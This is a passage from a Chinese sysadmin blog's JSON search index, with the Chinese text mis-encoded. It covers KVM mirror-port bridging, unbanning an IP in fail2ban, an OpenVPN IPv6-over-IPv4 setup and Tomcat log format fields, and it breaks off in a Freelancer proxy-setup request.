\u0026#34;$IFACE\u0026#34; = br2 ]; then  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ebrctl setageing br2 0  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ebrctl setfd br2 0  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003efi  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod +x br2-mirror  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨å®¿ä¸»æœºä¸Šé—®é¢˜è§£å†³äº†ï¼Œåœ¨kvmè™šæœºä¸Šåˆé‡åˆ°é—®é¢˜ï¼ŒUbuntuï¼Œå¦‚æœè®©ä¸€ä¸ªç½‘å£å¯åŠ¨ä½†æ²¡æœ‰åœ°å€å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/network/interfaces  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauto ens7  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiface ens7 inet manual  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    mtu \u003cspan class=\"m\"\u003e1464\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eup ifconfig ens7 up  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢çš„ï¼Œens7å°±æ˜¯mirrorè¿‡æ¥çš„ç½‘å£ï¼Œmtuæ˜¯å› ä¸ºåœ¨ciscoåšmirrorçš„æ—¶å€™æŒ‡å®šäº†å›ºå®šçš„mtu 1464.\u003c/p\u003e\n\u003cp\u003ebrctlå‘½ä»¤çš„ç”¨æ³•å¯ä»¥å‚è§ä»¥ä¸‹é“¾æ¥ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.thegeekstuff.com/2017/06/brctl-bridge/\"\u003ehttps://www.thegeekstuff.com/2017/06/brctl-bridge/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eover.\u003c/p\u003e","title":"Mirror å£ç›´é€šåˆ°Kvmä¸­å»é‡åˆ°çš„å‡ ä¸ªé—®é¢˜"},{"content":"mouse çš„æœåŠ¡å™¨è¿æ¥åˆ°äº†å„ä¸ªç½‘ç»œæ ¸å¿ƒè®¾å¤‡ï¼Œæ‰€ä»¥é‡‡ç”¨äº†å¾ˆä¸¥æ ¼çš„ipé™åˆ¶ï¼Œporté™åˆ¶ï¼Œä»¥åŠfail2banæ¥é˜»æ­¢éæ³•è®¿é—®ï¼Œä½†æ˜¯ä¸å·§ï¼ŒæŠŠè‡ªå·±ä¹Ÿç»™æåˆ° jail é‡Œå»äº†ã€‚\né‚£ä¹ˆæ€ä¹ˆè§£å‘¢ï¼Ÿ\né¦–å…ˆæŸ¥çœ‹å°é”æƒ…å†µï¼š\nfail2ban-client status Status |- Number of jail: 2 `- Jail list: sshd, sshd-ddos æœ‰ä¸¤ä¸ªjailï¼Œsshdå’Œsshd-ddos\nè¿›ä¸€æ­¥æŸ¥çœ‹ï¼š\nfail2ban-client status sshd å‘ç°è‡ªå·±è¢«å±è”½äº†ã€‚\nè§£å°çš„æ–¹æ³•ï¼š\nfail2ban-client set sshd unbanip 103.108.236.5 è§£å°åªæ˜¯ä¸´æ—¶çš„ï¼Œæ°¸ä¹…æ”¾å…¥ç™½åå•æœ€é è°±ï¼š\nvi /etc/fail2ban/jail.conf ignoreip = 103.108.236.5/32 é‡å¯fail2ban\nsystemctl restart fail2ban è¿™æ ·å°±okäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240124-fail2ban_unban/","summary":"\u003cp\u003emouse çš„æœåŠ¡å™¨è¿æ¥åˆ°äº†å„ä¸ªç½‘ç»œæ ¸å¿ƒè®¾å¤‡ï¼Œæ‰€ä»¥é‡‡ç”¨äº†å¾ˆä¸¥æ ¼çš„ipé™åˆ¶ï¼Œporté™åˆ¶ï¼Œä»¥åŠfail2banæ¥é˜»æ­¢éæ³•è®¿é—®ï¼Œä½†æ˜¯ä¸å·§ï¼ŒæŠŠè‡ªå·±ä¹Ÿç»™æåˆ° jail é‡Œå»äº†ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆæ€ä¹ˆè§£å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæŸ¥çœ‹å°é”æƒ…å†µï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efail2ban-client status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStatus  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e- Number of jail:    \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e- Jail list:    sshd, sshd-ddos\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ‰ä¸¤ä¸ªjailï¼Œsshdå’Œsshd-ddos\u003c/p\u003e\n\u003cp\u003eè¿›ä¸€æ­¥æŸ¥çœ‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efail2ban-client status sshd  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20240124160424122\" loading=\"lazy\" src=\"/posts/20240124-fail2ban_unban/image-20240124160424122.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå‘ç°è‡ªå·±è¢«å±è”½äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè§£å°çš„æ–¹æ³•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efail2ban-client \u003cspan class=\"nb\"\u003eset\u003c/span\u003e sshd unbanip 103.108.236.5  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£å°åªæ˜¯ä¸´æ—¶çš„ï¼Œæ°¸ä¹…æ”¾å…¥ç™½åå•æœ€é è°±ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/fail2ban/jail.conf  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eignoreip\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 103.108.236.5/32  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‡å¯fail2ban\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl restart fail2ban  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å°±okäº†ã€‚\u003c/p\u003e","title":"Fail2banæ€ä¹ˆè§£æ”¾å¹¶æ”¾å…¥ç™½åå•"},{"content":"å…ˆæ™®åŠä¸€ä¸‹IPv6 åœ°å€ã€‚\nIPv6 åœ°å€å¤§å°ä¸º 128 ä½ã€‚\né¦–é€‰ IPv6 åœ°å€è¡¨ç¤ºæ³•ä¸º8ç»„æ•°å­—ç”¨å†’å·åˆ†éš”ï¼Œå…¶ä¸­æ¯ç»„æ˜¯ 8 ä¸ª 16 ä½éƒ¨åˆ†çš„åå…­è¿›åˆ¶å€¼ã€‚IPv6 åœ°å€èŒƒå›´ä» 0000:0000:0000:0000:0000:0000:0000:0000 è‡³ ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffã€‚\né™¤æ­¤é¦–é€‰æ ¼å¼ä¹‹å¤–ï¼ŒIPv6 åœ°å€è¿˜å¯ä»¥ç”¨å…¶ä»–ä¸¤ç§çŸ­æ ¼å¼æŒ‡å®šï¼š\nçœç•¥å‰å¯¼é›¶ é€šè¿‡çœç•¥å‰å¯¼é›¶æŒ‡å®š IPv6 åœ°å€ã€‚ ä¾‹å¦‚ï¼ŒIPv6 åœ°å€ 1050:0000:0000:0000:0005:0600:300c:326b å¯å†™ä½œ 1050:0:0:0:5:600:300c:326bã€‚ åŒå†’å· é€šè¿‡ä½¿ç”¨åŒå†’å·ï¼ˆ::ï¼‰æ›¿æ¢ä¸€ç³»åˆ—é›¶æ¥æŒ‡å®š IPv6 åœ°å€ã€‚ ä¾‹å¦‚ï¼ŒIPv6 åœ°å€ ff06:0:0:0:0:0:0:c3 å¯å†™ä½œ ff06::c3ã€‚ ä¸€ä¸ª IP åœ°å€ä¸­åªå¯ä½¿ç”¨ä¸€æ¬¡åŒå†’å·ã€‚ åœ¨ä¸€èˆ¬IPv6ç½‘ç»œç¯å¢ƒä¸‹ï¼Œä¸€ä¸ªå±€åŸŸç½‘çš„å­ç½‘å¤§å°ä¸º/64ï¼Œæ¥å£é€šè¿‡NDPåè®®è·å¾—è‡ªå·±çš„å”¯ä¸€IPv6åœ°å€ï¼ˆå‰64ä½ä¸ºå­ç½‘å‰ç¼€ï¼Œå64ä½ä¸€èˆ¬ç”±æ¥å£æœ¬èº«çš„MACåœ°å€äº§ç”Ÿï¼‰\næˆ‘ä»¬çš„åœºæ™¯ï¼š\næœåŠ¡å™¨çš„IPV4åœ°å€æ˜¯ 1.2.3.4 æœåŠ¡å™¨çš„IPV6åœ°å€æ˜¯ aaaa:bbbb:cccc:dddd::/64 IPV4å’ŒIPV6çš„åœ°å€éƒ½åœ¨eth0ä¸Š VPNåˆ†é…ç»™å®¢æˆ·ç«¯çš„IPV6åœ°å€æ˜¯aaaa:bbbb:cccc:dddd:80::/112ï¼Œä½¿ç”¨çš„æ¥å£æ˜¯tun0 é…ç½®è¿‡ç¨‹å¦‚ä¸‹ï¼š é¦–å…ˆä¿®æ”¹/etc/sysctl.confæ–‡ä»¶\nnet.ipv4.ip_forward=1 ... net.ipv6.conf.all.forwarding=1 net.ipv6.conf.all.proxy_ndp = 1 ... net.ipv4.conf.all.accept_redirects = 0 net.ipv6.conf.all.accept_redirects = 0 ... net.ipv4.conf.all.send_redirects = 0 æ¥ä¸‹æ¥ï¼Œå¯ä»¥å…ˆåšiptableï¼Œä½¿å¾—openvpn serverå¯¹åŒ…è¿›è¡ŒSNAT\niptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE æˆ–è€… iptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1 ç¼–è¾‘/etc/openvpn/variableså˜é‡\n# å®¢æˆ·ç«¯IPæ®µå‰ç¼€ # Tunnel subnet prefix prefix=aaaa:bbbb:cccc:dddd:80: # netmask prefixlen=112 å‡†å¤‡ä¸¤ä¸ªè„šæœ¬ï¼Œåœ¨ä¸å®¢æˆ·ç«¯å»ºç«‹è¿æ¥å’Œæ–­å¼€è¿æ¥æ—¶æ‰§è¡Œï¼Œç”¨æ¥å»ºç«‹æˆ–è€…å–æ¶ˆNDP proxy rulesã€‚ /etc/openvpn/up.sh\n#!/bin/sh # Check client variables if [ -z \u0026#34;$ifconfig_pool_remote_ip\u0026#34; ] || [ -z \u0026#34;$common_name\u0026#34; ]; then echo \u0026#34;Missing environment variable.\u0026#34; exit 1 fi # Load server variables . /etc/openvpn/variables ipv6=\u0026#34;\u0026#34; ipp=$(echo \u0026#34;$ifconfig_pool_remote_ip\u0026#34; | cut -d. -f4) if ! [ \u0026#34;$ipp\u0026#34; -ge 2 -a \u0026#34;$ipp\u0026#34; -le 254 ] 2\u0026gt;/dev/null; then echo \u0026#34;Invalid IPv4 part.\u0026#34; exit 1 fi hexipp=$(printf \u0026#39;%x\u0026#39; $ipp) ipv6=\u0026#34;$prefix$hexipp\u0026#34; # Create proxy rule /sbin/ip -6 neigh add proxy $ipv6 dev eth0 /etc/openvpn/down.sh\n#!/bin/sh # Check client variables if [ -z \u0026#34;$ifconfig_pool_remote_ip\u0026#34; ] || [ -z \u0026#34;$common_name\u0026#34; ]; then echo \u0026#34;Missing environment variable.\u0026#34; exit 1 fi # Load server variables . /etc/openvpn/variables ipv6=\u0026#34;\u0026#34; ipp=$(echo \u0026#34;$ifconfig_pool_remote_ip\u0026#34; | cut -d. -f4) if ! [ \u0026#34;$ipp\u0026#34; -ge 2 -a \u0026#34;$ipp\u0026#34; -le 254 ] 2\u0026gt;/dev/null; then echo \u0026#34;Invalid IPv4 part.\u0026#34; exit 1 fi hexipp=$(printf \u0026#39;%x\u0026#39; $ipp) ipv6=\u0026#34;$prefix$hexipp\u0026#34; # Delete proxy rule /sbin/ip -6 neigh del proxy $ipv6 dev eth0 è¿™ä¸¤ä¸ªè„šæœ¬æƒé™åº”è¯¥éƒ½æ˜¯755\næœåŠ¡å™¨ç«¯server.confä¸­çš„ç›¸å…³é…ç½®ï¼š\n# Run client-specific script on connection and disconnection script-security 2 client-connect \u0026#34;/etc/openvpn/up.sh\u0026#34; client-disconnect \u0026#34;/etc/openvpn/down.sh\u0026#34; # Server mode and client subnets server 10.8.0.0 255.255.255.0 server-ipv6 aaaa:bbbb:cccc:dddd:80::/112 topology subnet # IPv6 routes push \u0026#34;route-ipv6 aaaa:bbbb:cccc:dddd::/64\u0026#34; push \u0026#34;route-ipv6 2000::/3\u0026#34; å®¢æˆ·ç«¯client.ovpnä¸­çš„ç›¸å…³é…ç½®\nremote 1.2.3.4 1194 å¯åŠ¨æœåŠ¡å™¨ç«¯ï¼Œç„¶åå†å¯åŠ¨å®¢æˆ·ç«¯è¿æ¥ æµ‹è¯•ä¸€ä¸‹ï¼š\ntraceroute6 ipv6.google.com è¿™æ ·å°±okäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240124-vpn_ipv6_ipv4/","summary":"\u003cp\u003eå…ˆæ™®åŠä¸€ä¸‹IPv6 åœ°å€ã€‚\u003c/p\u003e\n\u003cp\u003eIPv6 åœ°å€å¤§å°ä¸º 128 ä½ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–é€‰ IPv6 åœ°å€è¡¨ç¤ºæ³•ä¸º8ç»„æ•°å­—ç”¨å†’å·åˆ†éš”ï¼Œå…¶ä¸­æ¯ç»„æ˜¯ 8 ä¸ª 16 ä½éƒ¨åˆ†çš„åå…­è¿›åˆ¶å€¼ã€‚IPv6 åœ°å€èŒƒå›´ä» 0000:0000:0000:0000:0000:0000:0000:0000 è‡³ ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffã€‚\u003c/p\u003e\n\u003cp\u003eé™¤æ­¤é¦–é€‰æ ¼å¼ä¹‹å¤–ï¼ŒIPv6 åœ°å€è¿˜å¯ä»¥ç”¨å…¶ä»–ä¸¤ç§çŸ­æ ¼å¼æŒ‡å®šï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eçœç•¥å‰å¯¼é›¶\né€šè¿‡çœç•¥å‰å¯¼é›¶æŒ‡å®š IPv6 åœ°å€ã€‚\nä¾‹å¦‚ï¼ŒIPv6 åœ°å€ 1050:0000:0000:0000:0005:0600:300c:326b å¯å†™ä½œ 1050:0:0:0:5:600:300c:326bã€‚\u003c/li\u003e\n\u003cli\u003eåŒå†’å·\né€šè¿‡ä½¿ç”¨åŒå†’å·ï¼ˆ::ï¼‰æ›¿æ¢ä¸€ç³»åˆ—é›¶æ¥æŒ‡å®š IPv6 åœ°å€ã€‚\nä¾‹å¦‚ï¼ŒIPv6 åœ°å€ ff06:0:0:0:0:0:0:c3 å¯å†™ä½œ ff06::c3ã€‚\nä¸€ä¸ª IP åœ°å€ä¸­åªå¯ä½¿ç”¨ä¸€æ¬¡åŒå†’å·ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eåœ¨ä¸€èˆ¬IPv6ç½‘ç»œç¯å¢ƒä¸‹ï¼Œä¸€ä¸ªå±€åŸŸç½‘çš„å­ç½‘å¤§å°ä¸º/64ï¼Œæ¥å£é€šè¿‡NDPåè®®è·å¾—è‡ªå·±çš„å”¯ä¸€IPv6åœ°å€ï¼ˆå‰64ä½ä¸ºå­ç½‘å‰ç¼€ï¼Œå64ä½ä¸€èˆ¬ç”±æ¥å£æœ¬èº«çš„MACåœ°å€äº§ç”Ÿï¼‰\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬çš„åœºæ™¯ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eæœåŠ¡å™¨çš„IPV4åœ°å€æ˜¯ 1.2.3.4\u003c/li\u003e\n\u003cli\u003eæœåŠ¡å™¨çš„IPV6åœ°å€æ˜¯ aaaa:bbbb:cccc:dddd::/64\u003c/li\u003e\n\u003cli\u003eIPV4å’ŒIPV6çš„åœ°å€éƒ½åœ¨eth0ä¸Š\u003c/li\u003e\n\u003cli\u003eVPNåˆ†é…ç»™å®¢æˆ·ç«¯çš„IPV6åœ°å€æ˜¯aaaa:bbbb:cccc:dddd:80::/112ï¼Œä½¿ç”¨çš„æ¥å£æ˜¯tun0\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eé…ç½®è¿‡ç¨‹å¦‚ä¸‹ï¼š é¦–å…ˆä¿®æ”¹\u003ccode\u003e/etc/sysctl.conf\u003c/code\u003eæ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.ip_forward\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv6.conf.all.forwarding\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv6.conf.all.proxy_ndp \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.all.accept_redirects \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv6.conf.all.accept_redirects \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.all.send_redirects \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ¥ä¸‹æ¥ï¼Œå¯ä»¥å…ˆåšiptableï¼Œä½¿å¾—openvpn serverå¯¹åŒ…è¿›è¡ŒSNAT\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæˆ–è€…\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¾‘\u003ccode\u003e/etc/openvpn/variables\u003c/code\u003eå˜é‡\u003c/p\u003e","title":"é…ç½®ä¸€ä¸ªæä¾›IPv6 tunnel over IPv4çš„OpenVPNæœåŠ¡å™¨"},{"content":"æˆ‘ä»¬tomcatçš„æ—¥å¿—è®°å½•æ ¼å¼ä¸ºï¼š\npattern=\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; resolveHosts=\u0026#34;false\u0026#34;/\u0026gt; éƒ½æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ\n%a - Remote IP address %A - Local IP address %b - Bytes sent, excluding HTTP headers, or \u0026lsquo;-\u0026rsquo; if zero %B - Bytes sent, excluding HTTP headers %h - Remote host name (or IP address if resolveHosts is false) %H - Request protocol %l - Remote logical username from identd (always returns \u0026lsquo;-\u0026rsquo;) %m - Request method (GET, POST, etc.) %p - Local port on which this request was received %q - Query string (prepended with a \u0026lsquo;?\u0026rsquo; if it exists) %r - First line of the request (method and request URI) %s - HTTP status code of the response %S - User session ID %t - Date and time, in Common Log Format %u - Remote user that was authenticated (if any), else \u0026lsquo;-\u0026rsquo; %U - Requested URL path %v - Local server name %D - Time taken to process the request, in millis %T - Time taken to process the request, in seconds %I - Current request thread name (can compare later with stacktraces) å¦å¤–ï¼Œè¿˜å¯ä»¥å°†requestè¯·æ±‚çš„æŸ¥è¯¢å‚æ•°ã€sessionä¼šè¯å˜é‡å€¼ã€cookieå€¼æˆ–HTTPè¯·æ±‚/å“åº”å¤´å†…å®¹çš„å˜é‡å€¼ç­‰å†…å®¹å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ã€‚\nå®ƒä»¿ç…§äº†apacheçš„è¯­æ³•ï¼š\nï¼…{XXX}i xxxä»£è¡¨ä¼ å…¥çš„å¤´(HTTP Request) ï¼…{XXX}o xxxä»£è¡¨ä¼ å‡ºçš„å“åº”å¤´(Http Resonse) ï¼…{XXX}c xxxä»£è¡¨ç‰¹å®šçš„Cookieå ï¼…{XXX}r xxxä»£è¡¨ServletRequestå±æ€§å ï¼…{XXX}s xxxä»£è¡¨HttpSessionä¸­çš„å±æ€§å \u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; ç¿»è¯‘è¿‡æ¥å°±æ˜¯\n\u0026#34;è¿œç¨‹åœ°å€|æœ¬åœ°åœ°å€|å“åº”æ—¶é—´|X-Forwarded-For|è¿œç¨‹ç”¨æˆ·|è¿œç¨‹è®¤è¯ç”¨æˆ·|æ—¶é—´|ç¬¬ä¸€è¡Œ|å›åº”code|å‘é€å­—èŠ‚|Referer|User-Agent \u0026#34; ä¾‹å­ï¼š\n10.11.9.190|10.11.10.13|0.153|111.199.189.182|-|-|[04/May/2018:21:31:02 +0800]|GET /cms/rest.htm?v=1.0 HTTP/1.0|200|48939|-|Dalvik/2.1.0 (Linux; U; Android 7.0; PIC-AL00 Build/HUAWEIPIC-AL00) è¿™æ ·å°±æ¯”è¾ƒå…¨äº†ï¼Œæœ¬æœºIP/å¤–æ¥IPï¼Œå¦‚æœå‰é¢æ˜¯nginxä»£ç†çš„ï¼Œipå’Œå†…å®¹ä»¥åŠuser-agentéƒ½èƒ½è®°å½•ä¸‹æ¥ï¼Œä»¥ä¾¿ä¹‹åæŸ¥æ‰¾å’Œå¤„ç†ã€‚\n","permalink":"https://rendoumi.com/posts/20240124-tomcat_log_format/","summary":"\u003cp\u003eæˆ‘ä»¬tomcatçš„æ—¥å¿—è®°å½•æ ¼å¼ä¸ºï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003epattern\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eresolveHosts\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e/\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eéƒ½æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e%a - Remote IP address\u003c/li\u003e\n\u003cli\u003e%A - Local IP address\u003c/li\u003e\n\u003cli\u003e%b - Bytes sent, excluding HTTP headers, or \u0026lsquo;-\u0026rsquo; if zero\u003c/li\u003e\n\u003cli\u003e%B - Bytes sent, excluding HTTP headers\u003c/li\u003e\n\u003cli\u003e%h - Remote host name (or IP address if resolveHosts is false)\u003c/li\u003e\n\u003cli\u003e%H - Request protocol\u003c/li\u003e\n\u003cli\u003e%l - Remote logical username from identd (always returns \u0026lsquo;-\u0026rsquo;)\u003c/li\u003e\n\u003cli\u003e%m - Request method (GET, POST, etc.)\u003c/li\u003e\n\u003cli\u003e%p - Local port on which this request was received\u003c/li\u003e\n\u003cli\u003e%q - Query string (prepended with a \u0026lsquo;?\u0026rsquo; if it exists)\u003c/li\u003e\n\u003cli\u003e%r - First line of the request (method and request URI)\u003c/li\u003e\n\u003cli\u003e%s - HTTP status code of the response\u003c/li\u003e\n\u003cli\u003e%S - User session ID\u003c/li\u003e\n\u003cli\u003e%t - Date and time, in Common Log Format\u003c/li\u003e\n\u003cli\u003e%u - Remote user that was authenticated (if any), else \u0026lsquo;-\u0026rsquo;\u003c/li\u003e\n\u003cli\u003e%U - Requested URL path\u003c/li\u003e\n\u003cli\u003e%v - Local server name\u003c/li\u003e\n\u003cli\u003e%D - Time taken to process the request, in millis\u003c/li\u003e\n\u003cli\u003e%T - Time taken to process the request, in seconds\u003c/li\u003e\n\u003cli\u003e%I - Current request thread name (can compare later with stacktraces)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eå¦å¤–ï¼Œè¿˜å¯ä»¥å°†requestè¯·æ±‚çš„æŸ¥è¯¢å‚æ•°ã€sessionä¼šè¯å˜é‡å€¼ã€cookieå€¼æˆ–HTTPè¯·æ±‚/å“åº”å¤´å†…å®¹çš„å˜é‡å€¼ç­‰å†…å®¹å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ã€‚\u003c/p\u003e","title":"Tomcatæ¨èçš„æ—¥å¿—è®°å½•æ ¼å¼"},{"content":"Freelancerä¸Šæœ‰ä¸ªproxy setupçš„ä»»åŠ¡ï¼š\nProject Description Hi, I would like to create a new VPS proxy server with multiple IPs on the same VPS. Are you able to that? What OS do you prefer? - I have 10 ips.\r- I want them to be as much anonymous as you can.\r- I would have an Username and Password as auth, but if needed the possibility to have an IP authentication too.\rMy budget is: ~20$ Thank you in advance. 